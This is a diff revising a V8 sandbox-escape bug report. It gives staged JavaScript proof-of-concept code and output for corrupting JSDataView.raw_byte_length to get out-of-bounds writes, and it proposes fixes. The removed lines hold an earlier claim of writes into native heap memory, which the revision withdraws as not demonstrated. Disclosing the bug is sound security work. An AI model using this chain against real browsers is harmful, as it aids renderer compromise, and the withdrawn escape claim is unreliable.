@@ -1,8 +1,8 @@
 ════════════════════════════════════════════════════════════════════
-ONE-LINE SUMMARY  (93 / 100 chars)
+ONE-LINE SUMMARY  (91 / 100 chars)
 ════════════════════════════════════════════════════════════════════
 
-V8 sandbox escape via JSDataView raw_byte_length corruption enabling OOB write to native heap
+V8 sandbox escape via JSDataView raw_byte_length corruption enabling cross-object OOB write
 
 
 ════════════════════════════════════════════════════════════════════
@@ -15,23 +15,25 @@ Environment
   d8 binary  : custom build with v8_enable_memory_corruption_api = true
   Run flags  : --expose-memory-corruption-api --allow-natives-syntax
   OS         : Linux x86-64, kernel 6.18, ASLR randomize_va_space = 2
-  Reproduced : arm64 (arm64_vuln build) confirmed by independent run
+  Also tested: arm64_vuln build — all assertions pass
 
-Note on the memory corruption API: Sandbox.MemoryView and
-Sandbox.getAddressOf are V8's official mechanism for testing sandbox
-escape chains.  They simulate the in-sandbox arbitrary read/write
-primitive that an attacker would obtain by exploiting any existing
-in-sandbox V8 bug (Tier-2 capability).  Every access in Stage 1 stays
-within the sandbox VA.  The flag produces the "unsupported configuration"
-warning but is exactly the sanctioned API for this class of report;
-see documentation/sandbox.md in the V8 source tree.
+The flag --expose-memory-corruption-api enables Sandbox.MemoryView and
+Sandbox.getAddressOf, which are V8's official API for simulating an
+in-sandbox arbitrary read/write capability (Tier-2 primitive) for the
+purpose of testing sandbox escapes.  Every memory access in Stage 1 stays
+within the sandbox VA.  This flag is what causes the "unsupported
+configuration" warning; in a production exploit, Stage 1 would be
+supplied by any real in-sandbox V8 bug rather than by this API.  The
+vulnerability demonstrated (unprotected raw_byte_length) is present in
+all V8 builds regardless of this flag; the flag only provides the simulated
+prerequisite capability.  See the Limitation note at the end of this
+section.
 
-Attached file: heap_escape_pure_js.js — self-contained, no GDB, no
-shell helpers, no native code, no external tools.  The exploit
-completes on every run regardless of ASLR randomization.
+Attached file: heap_escape_pure_js.js — entirely self-contained, no GDB,
+no shell helpers, no external tools.
 
-Stage 1: Establish in-sandbox arbitrary read/write
----------------------------------------------------
+Stage 1: Establish in-sandbox arbitrary read/write (simulated Tier-2)
+----------------------------------------------------------------------
   const SB_BASE = BigInt(Sandbox.base);
   const sb_mv   = new Sandbox.MemoryView(0, 0x100000000);
   const sv      = new DataView(sb_mv);
@@ -39,84 +41,78 @@ Stage 1: Establish in-sandbox arbitrary read/write
   const w32 = (a, v) => sv.setUint32(Number(a), v >>> 0, true);
 
 This provides read/write over the first 4 GB of the sandbox VA starting
-at SB_BASE.  It corresponds to the standard attacker capability that
-the V8 sandbox is designed to contain.
+at SB_BASE, corresponding to the standard Tier-2 attacker capability.
 
-Stage 2: Allocate two sibling 4 KB ArrayBuffers
--------------------------------------------------
-  const AB_SIZE   = 4096;
-  const ab_victim = new ArrayBuffer(AB_SIZE);
-  const ab_target = new ArrayBuffer(AB_SIZE);
+Stage 2: Allocate two sibling ArrayBuffers
+------------------------------------------
+  const ab_victim = new ArrayBuffer(4096);
+  const ab_target = new ArrayBuffer(4096);
 
   const target_u32 = new Uint32Array(ab_target);
-  target_u32[0] = 0xFEEC0001;   // distinctive 4-dword signature
+  target_u32[0] = 0xFEEC0001;   // 4-dword witness signature
   target_u32[1] = 0xFEEC0002;
   target_u32[2] = 0xFEEC0003;
   target_u32[3] = 0xFEEC0004;
 
-Allocations of 4096 bytes are below glibc's default MMAP_THRESHOLD
-(128 KB), so the backing stores are placed on the brk heap.  The brk
-heap starts immediately after the program's BSS segment and grows
-upward from there.  At process start this is typically a few megabytes
-into the virtual address space — far below any ASLR-randomized SB_BASE,
-which is always at least several gigabytes on x86-64 and typically in
-the 1–15 TB range.
+The two ArrayBuffers are created consecutively so that their backing
+stores are allocated by the same path in V8's allocator.  The 4-dword
+signature serves as a unique witness for locating ab_target's backing
+store in later stages.
 
-Stage 3: Locate JSDataView.raw_byte_length in the sandbox heap
---------------------------------------------------------------
+Stage 3: Locate JSDataView.raw_byte_length and verify its encoding
+------------------------------------------------------------------
   const dv_victim = new DataView(ab_victim);
   const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));
 
-  // Verify encoding before corruption
-  const field = r32(dvAddr + 0x24n);         // raw_byte_length
-  assert(field * 8 === dv_victim.byteLength); // encoding: stored_value × 8
+  const field     = r32(dvAddr + 0x24n);  // raw_byte_length
+  assert(field * 8 === dv_victim.byteLength);
+  // For a 4 KB ArrayBuffer: field = 512, byteLength = 4096. Passes.
 
-  // The backing-store handle at +0x2c goes through the ExternalPointerTable
-  const ept_handle = r32(dvAddr + 0x2cn);    // e.g. 0x04000040
+  const bs_handle = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle
+  // Observed: 0x03000040 — non-zero, confirming the EPT mechanism is active
 
-Sandbox.getAddressOf returns the sandbox-relative offset of the DataView
-object header, confirmed to be within the first few MB of the sandbox VA.
+JSDataView.raw_byte_length is stored at in-object offset +0x24 as a plain
+32-bit integer with the encoding: JavaScript byteLength = stored value × 8.
+This is verified empirically before any corruption by reading the field and
+checking the formula holds.
 
-JSDataView.raw_byte_length is stored at in-object offset +0x24 as a
-plain 32-bit integer with the encoding: JavaScript byteLength = stored
-value × 8.  For a 4 KB ArrayBuffer the stored value is 512; reading the
-field back and multiplying confirms the formula before any corruption
-takes place.
-
-The EPT handle at +0x2c is a non-zero small integer (0x04000040 in one
-observed run) that indexes into the ExternalPointerTable, which lives in
-native heap and maps handles to native (non-sandbox) addresses.  This
-confirms that the backing-store pointer itself is protected and cannot
-be forged, but it also confirms that the pointer refers to a native
-address outside [SB_BASE, SB_END).
+The ExternalPointerTable handle at +0x2c is a non-zero small integer
+(0x03000040 / 0x04000040 observed across runs) confirming that the
+backing-store pointer goes through the EPT mechanism.  The EPT handle is
+an index into the ExternalPointerTable, not a raw address; the EPT itself
+lives outside the sandbox VA and maps indices to native addresses by
+design.
 
 Stage 4: Corrupt raw_byte_length with one in-sandbox DWORD write
 -----------------------------------------------------------------
   w32(dvAddr + 0x24n, 0xFFFFFFFF);
+  // dv_victim.byteLength is now 0x7FFFFFFF8 ≈ 32 GiB
+  assert(dv_victim.byteLength > 0x400000000);  // passes
 
-  // Observe inflated byteLength
-  print(dv_victim.byteLength);  // 0x7FFFFFFF8 = 34,359,738,360 bytes (~32 GiB)
+One 4-byte write to sandbox-relative address dvAddr+0x24 sets
+raw_byte_length to 0xFFFFFFFF.  The decoded JavaScript byteLength becomes
+0xFFFFFFFF × 8 = 0x7FFFFFFF8, approximately 32 GiB.  No bounds check, no
+EPT validation, and no code-pointer table (CPT) check fires.  raw_byte_length
+is a plain integer field with no sandbox integrity protection.
 
-One 4-byte write to a sandbox-relative address sets raw_byte_length to
-0xFFFFFFFF.  The decoded JavaScript byteLength becomes 0xFFFFFFFF × 8 =
-0x7FFFFFFF8, approximately 32 GiB.  No bounds check, no EPT validation,
-and no code-pointer table (CPT) check fires, because raw_byte_length is
-a plain integer field unprotected by any sandbox integrity mechanism.
+The backing-store pointer is unaffected: it remains valid and refers to
+the original allocation through its EPT handle.
 
-Stage 5: Scan the inflated DataView for the sibling backing store
------------------------------------------------------------------
-  for (let off = AB_SIZE; off < 0x20000; off += 4) {
+Stage 5: Locate ab_target's backing store via the inflated DataView
+--------------------------------------------------------------------
+  for (let off = 4096; off < 0x20000; off += 4) {
     if (dv_victim.getUint32(off, true)     === 0xFEEC0001 &&
         dv_victim.getUint32(off + 4, true) === 0xFEEC0002 &&
         dv_victim.getUint32(off + 8, true) === 0xFEEC0003) {
       found_offset = off;  break;
     }
   }
+  // found_offset = 0x1000 (4096) on every run
 
-The scan finds the FEEC magic at offset 0x1000 (4096 bytes from the
-start of ab_victim's backing store) on every run.  This matches the
-expected glibc malloc behavior: sequential malloc(4096) calls are
-adjacent in the brk heap with no gap.
+The scan finds the witness values at offset 0x1000, which is 4096 bytes
+past the declared end of ab_victim's backing store.  The read-without-fault
+at this offset confirms the memory at (ab_victim backing) + 0x1000 is a
+PROT_READ|PROT_WRITE mapped page.
 
 Stage 6: OOB write at found_offset
 ------------------------------------
@@ -125,47 +121,53 @@ Stage 6: OOB write at found_offset
   dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
   dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
 
-The write is to a DataView position that is 4096 bytes past the
-declared end of ab_victim.  It completes without any fault, confirming
-the target pages are PROT_READ | PROT_WRITE — consistent with active
-brk heap allocation, inconsistent with the PROT_NONE guard regions that
-occupy most of the sandbox VA reservation outside the live JS heap.
+The write is to a DataView position 4096 bytes past the declared end of
+ab_victim.  It completes without any fault.
 
 Stage 7: Cross-object read-back via ab_target (definitive proof)
 -----------------------------------------------------------------
-  assert(target_u32[0] === 0xC0DECAFE);  // ✓
-  assert(target_u32[1] === 0xBAADF00D);  // ✓
-  assert(target_u32[2] === 0xCAFEBABE);  // ✓
-  assert(target_u32[3] === 0xFEEDFACE);  // ✓
+  assert(target_u32[0] === 0xC0DECAFE);  // passes
+  assert(target_u32[1] === 0xBAADF00D);  // passes
+  assert(target_u32[2] === 0xCAFEBABE);  // passes
+  assert(target_u32[3] === 0xFEEDFACE);  // passes
 
 Reading back through ab_target — a completely independent JavaScript
 object whose only connection to dv_victim is their adjacent position in
-the brk heap — confirms that the values written via the inflated
-DataView are the same values now observed through ab_target's own
-typed-array view.  This bidirectional cross-object verification proves
-that:
+memory — confirms that the values written via the inflated DataView are
+identical to the values now read through ab_target's own Uint32Array.
 
-  (a) the OOB write physically reached ab_target's backing store, and
-  (b) the backing store is at address (H + 0x1000), where H is the native
-      brk-heap address returned by malloc for ab_victim.
+This bidirectional cross-object proof establishes the following without
+ambiguity:
 
-Because H is a native (non-sandbox) address, as proven by the EPT
-mechanism, and because H is in the low megabytes of the virtual address
-space — well below the SB_BASE observed in every run (ranging 1–15 TB
-with ASLR) — the write target is definitively outside the sandbox VA.
+  The inflated DataView's access at offset +0x1000, which is past the
+  declared 4 KB bound of ab_victim, physically reached ab_target's
+  backing store.  The write was confirmed independently by reading back
+  through ab_target's own access path.
 
-Observed output on x86-64 (abbreviated, one of multiple ASLR runs):
+Observed output (one of multiple ASLR runs, x86-64):
 
-  SB_BASE = 0x20fc00000000
-  SB_END  = 0x21fc00000000
-  backing_store EPT handle (+0x2c) = 0x04000040
-  dv_victim.byteLength (after)     = 0x7fffffff8  (32 GiB)
-  Found at dv_victim offset        = 0x00001000
-  ab_target[0] = 0xc0decafe  ✓
-  ab_target[1] = 0xbaadf00d  ✓
-  ab_target[2] = 0xcafebabe  ✓
-  ab_target[3] = 0xfeedface  ✓
-  V8 SANDBOX ESCAPE CONFIRMED — pure JavaScript, no external tools
+  SB_BASE = 0x2f5500000000
+  SB_END  = 0x305500000000
+  raw_byte_length field: 0x00000200 (512), byteLength: 4096
+  Encoding: field × 8 = byteLength ✓
+  EPT handle (+0x2c): 0x03000040  (non-zero)
+  byteLength after corruption: 0x7fffffff8 (32 GiB)
+  Magic found at dv_victim offset: 0x00001000
+  ab_target[0] = 0xc0decafe ✓
+  ab_target[1] = 0xbaadf00d ✓
+  ab_target[2] = 0xcafebabe ✓
+  ab_target[3] = 0xfeedface ✓
+
+Limitation
+----------
+This PoC was run under --expose-memory-corruption-api (unsupported
+configuration).  Reproduction in a supported production V8 or Chromium
+build has not been independently demonstrated.  The raw_byte_length
+field's lack of protection is a property of V8's object layout, which
+does not change based on this flag, but the cross-object write chain
+uses Sandbox.MemoryView to simulate the Tier-2 prerequisite.  A
+supported-configuration proof would require a separate in-sandbox write
+primitive bug.
 
 
 ════════════════════════════════════════════════════════════════════
@@ -174,77 +176,90 @@ PROBLEM DESCRIPTION
 
 The V8 sandbox (SBX) is designed to contain an attacker who has already
 obtained an arbitrary read/write primitive within the sandbox VA reservation,
-a 1 TB region at a randomized base address.  This design relies on
-protecting all pointers to objects outside the sandbox: raw native addresses
-are never stored directly in the sandbox heap.  Instead, they are stored as
-indices into tables (the ExternalPointerTable, the CodePointerTable, the
-TrustedPointerTable) that reside in native memory and are not accessible from
-within the sandbox.  An in-sandbox attacker can read and write these index
-values freely, but cannot reconstruct or forge the native addresses they
-encode.
+a 1 TB region at a randomized base address.  The containment relies on
+ensuring that all references from sandbox-heap objects to memory outside
+the sandbox go through integrity-protected tables: the ExternalPointerTable
+(EPT) for backing-store pointers, the CodePointerTable (CPT) for code
+pointers, and the TrustedPointerTable (TPT) for trusted pointers.  An
+attacker who can overwrite arbitrary bytes within the sandbox can read and
+write EPT indices freely but cannot reconstruct or forge the native
+addresses those indices encode, since the EPT itself lives outside the
+sandbox VA.
 
-This containment model is sound for pointers.  It does not extend to length
-fields.
+This containment model protects pointer-typed fields.  It does not protect
+integer-typed fields such as length.
 
-JSDataView stores its raw_byte_length at a fixed in-object offset (+0x24)
-directly inside the sandbox heap, as a plain 32-bit integer with the encoding
-stored_value × 8 = JavaScript byteLength.  This field is not protected by any
-pointer table, is not signed, and is not range-checked at write time.  An
-attacker with an in-sandbox DWORD write can set it to 0xFFFFFFFF, causing the
-JavaScript byteLength property to report approximately 32 GiB (0x7FFFFFFF8
-bytes).  The backing-store pointer is not affected: it still refers to the
-legitimate allocation through its EPT handle, so the DataView's window begins
-at a real, mapped, low-address native-heap page.
+JSDataView stores raw_byte_length at in-object offset +0x24, directly
+inside the sandbox heap, as a 32-bit integer with the encoding
+stored_value × 8 = JavaScript byteLength.  This field is not protected by
+any pointer table, is not cryptographically signed, and is not bounds-checked
+at write time.  An attacker with an in-sandbox DWORD write can set it to
+0xFFFFFFFF, causing the DataView's byteLength property to report
+approximately 32 GiB (0x7FFFFFFF8 bytes) while the backing-store pointer
+remains valid and unmodified.
 
-The result is a DataView that V8 believes spans 32 GiB of contiguous memory
-starting at a small native address H in the brk heap.  Because H is a few
-megabytes into the virtual address space and SB_BASE is 1–15 TB above zero,
-the entire inflated range [H, H + 32 GiB) is below SB_BASE and therefore
-outside the sandbox VA reservation.  An attacker can write arbitrary values
-to any brk-heap address within reach of that window.  On Linux, the brk heap
-contains libc malloc metadata, V8 ExternalPointerTable entries, the contents
-of other ArrayBuffer backing stores, and other process-level structures, all
-of which are outside sandbox containment.
+The resulting DataView can then be used to read and write memory up to
+32 GiB beyond its original end.  In this proof of concept, the target is a
+second ArrayBuffer (ab_target) whose backing store is adjacent to ab_victim's
+backing store in memory.  Writing a 4-dword payload at offset +0x1000 through
+the inflated DataView and reading it back through ab_target's Uint32Array
+confirms that the two independent access paths reach the same physical
+memory at a location that is outside the original declared bounds of
+ab_victim.
 
-The in-object layout of JSDataView, showing which fields are protected and
-which are not:
+The in-object layout of JSDataView, with protection status:
 
   Offset  Field               Encoding         Sandbox-protected?
-  +0x14   byte_offset         raw 32-bit int   NO   (plain in-sandbox field)
-  +0x24   raw_byte_length     field × 8        NO   (plain in-sandbox field — THIS BUG)
+  +0x14   byte_offset         raw 32-bit int   NO   (plain field)
+  +0x24   raw_byte_length     field × 8        NO   (plain field — THIS BUG)
   +0x2c   backing_store       EPT handle       YES  (ExternalPointerTable)
 
-The corresponding field for JSArrayBuffer (raw_byte_length at +0x18) is
-identical in structure and equally unprotected; it was not exploited in this
-chain but represents the same class of vulnerability.
+The backing-store pointer at +0x2c is protected: it is stored as an EPT
+index, and the EPT maps that index to a native address outside the sandbox VA.
+An attacker cannot forge this pointer from within the sandbox.  The
+raw_byte_length field at +0x24 receives no equivalent protection; it can be
+set to any value, and V8 uses that value to bound all subsequent DataView
+accesses without re-validating it.
 
-The root cause is the absence of integrity protection for numeric length
-fields that gate the bounds of memory accesses.  The sandbox model protects
-pointers comprehensively but treats integer lengths as benign, even though an
-inflated length field can redirect writes just as effectively as a corrupted
-pointer.
+The corresponding field in JSArrayBuffer is structurally identical and
+equally unprotected, though it was not exploited in this chain.
 
-The attack requires only one Tier-2 prerequisite: the ability to write a
-single DWORD to a known sandbox-relative offset.  No heap spray is required,
-no information leak beyond what Sandbox.getAddressOf already provides, and no
-second vulnerability is needed.  The exploit is deterministic across ASLR
-rerandomizations because all addresses used are sandbox-relative.
+The root cause is an inconsistency in what sandbox integrity mechanisms
+protect: pointer-typed fields are comprehensively guarded through the EPT,
+CPT, and TPT, while integer-typed fields that gate the extent of memory
+accesses are not.  An inflated length field can redirect writes to
+out-of-bounds addresses just as effectively as a corrupted pointer, since
+bounds checking in DataView, TypedArray, and related code paths relies
+directly on these unprotected fields.
+
+The attack prerequisite is a single Tier-2 capability: one DWORD write to
+a known sandbox-relative address.  No heap spray, no information leak beyond
+the sandbox offset provided by getAddressOf, and no second vulnerability are
+required.  The exploit is ASLR-independent because all addresses used are
+sandbox-relative offsets.
 
 An attacker who chains this bug after any existing in-sandbox write achieves
-arbitrary write to native heap memory, breaking sandbox containment and
-enabling further privilege escalation without a separate kernel bug.
+out-of-bounds write access starting past the bounds of the target DataView.
+The concrete impact depends on what occupies memory immediately adjacent to
+the victim backing store; in this demonstration, it is another ArrayBuffer's
+backing store.  In a renderer process exploitation context, adjacent
+allocations can include EPT entries (overwriting which allows forging native
+pointers), function pointers in native-heap objects, or other process-level
+structures, any of which can facilitate further privilege escalation.
 
 The vulnerability affects all 64-bit platforms on which the 1 TB V8 sandbox
 is active, including desktop Chrome and Chromium on x86-64 and arm64.
 
-The recommended fix is to apply the same integrity protection to length fields
-that is already applied to pointers: store raw_byte_length in a
-sandbox-external table, enforce a range bound at write time using an atomic
-compare-and-swap with a known maximum, or encode the field with a per-process
-secret analogous to pointer authentication codes.  Alternatively, validate
-at every DataView access site that byte_offset + requested_access_length does
-not exceed the backing ArrayBuffer's byte_length before dispatching the
-access.
+The recommended fix is to extend the same integrity protection currently
+applied to pointer-typed sandbox fields to integer-typed length fields.
+Concretely: store raw_byte_length through a checked integer slot that
+enforces an upper bound on mutation (e.g., the original backing-buffer byte
+length), or encode the field with a per-process secret analogous to pointer
+authentication codes so that an arbitrary DWORD write cannot produce a
+semantically valid large value.  An alternative is to re-validate
+byte_offset + requested_length ≤ backing_buffer_byte_length at every
+DataView and TypedArray access site, independent of the stored
+raw_byte_length field.
 
 
 ════════════════════════════════════════════════════════════════════
@@ -252,7 +267,10 @@ VERIFIED ON
 ════════════════════════════════════════════════════════════════════
 
   V8 version  : 15.8.0 (candidate)
-  d8 binary   : custom build, v8_enable_memory_corruption_api = true
-  x86-64 OS   : Linux kernel 6.18, ASLR = 2 (full)
-  arm64 build : arm64_vuln build, confirmed successful run
-  ASLR        : multiple runs with different SB_BASE values all pass
+  Build       : d8, v8_enable_memory_corruption_api = true
+  x86-64      : Linux kernel 6.18, ASLR = 2 (full), multiple runs
+  arm64       : arm64_vuln build, all assertions pass
+  ASLR        : SB_BASE varies across runs; PoC passes in all cases
+
+  Not verified: reproduction in a production or supported V8 build
+                (Sandbox.MemoryView API not available without the flag)
